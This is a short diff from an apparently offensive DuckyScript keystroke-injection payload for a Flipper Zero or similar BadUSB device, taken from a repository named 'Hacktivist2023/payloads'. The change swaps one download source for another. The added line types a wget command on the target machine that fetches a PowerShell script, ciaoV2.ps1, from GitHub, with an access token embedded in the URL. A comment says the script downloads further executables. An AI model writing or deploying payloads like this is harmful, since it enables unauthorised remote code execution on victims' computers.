@@ -84,7 +84,8 @@ DELAY 500
 ENTER
 DELAY 1000
 REM Get the ciaoV2.ps1. This file contain the downloads of necessary executables
-STRING wget https://6269eaad-964d-42c8-8cf4-ddfdfd2b54c2.usrfiles.com/ugd/6269ea_616966b9a6ea4c948b3f0c4865c4fe23.txt -O ciaoV2.ps1
+REM STRING wget https://6269eaad-964d-42c8-8cf4-ddfdfd2b54c2.usrfiles.com/ugd/6269ea_616966b9a6ea4c948b3f0c4865c4fe23.txt -O ciaoV2.ps1
+STRING wget "https://raw.githubusercontent.com/Hacktivist2023/payloads/master/flipper%20zero/checked/ciaoV2.ps1?token=GHSAT0AAAAAACDYTBGTWFQ2HQED23E6P3GEZEFYOBQ" -O ciaoV2.ps1
 DELAY 500
 ENTER
 DELAY 1000
